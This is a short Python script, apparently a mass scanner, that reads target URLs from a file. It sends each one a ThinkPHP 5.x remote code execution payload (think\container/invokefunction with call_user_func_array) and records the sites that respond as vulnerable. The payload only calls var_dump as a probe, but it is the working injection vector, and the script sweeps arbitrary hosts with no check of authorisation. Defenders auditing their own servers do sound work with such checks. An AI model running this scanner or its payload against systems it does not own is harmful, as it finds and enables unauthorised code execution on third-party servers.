# coding:utf-8

import threading
import time
import requests
import os


def scan(urls):

    """Python 3.x"""

    """ 批量检测是否存在Think PHP 5.1 命令执行漏洞 """

    if urls[-1] != '/':

        urls += '/'

    headers = {'user-aget': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'}

    payload = "/index.php?s=index/think\container/invokefunction&function=call_user_func_array&vars[0]=var_dump&vars[1][]=testpage"

    url = urls + payload

    try:

        req = requests.get(url=url,headers=headers,timeout=10)

        if "testpage" in req.text:

            print("[+] Ture url:{}".format(urls))

            print("{}".format(urls),file=open('save.txt','a'))

        else:

            print("[-] False url:{}".format(urls))

    except:

        pass

if __name__ == '__main__':

    while True:

        text = input('url.txt:')

        if os.path.exists(text):
            print('[+]{} existence'.format(text))
            break

        else:
            print('[-]{} not existence'.format(text))
            continue

    with open("{}".format(text), 'r') as e:

        for r in e.readlines():

            qc = "".join(r.split('\n'))

            # print(qc)

            t = threading.Thread(target=scan, args=(qc,))
            t.start()

            time.sleep(0.5)
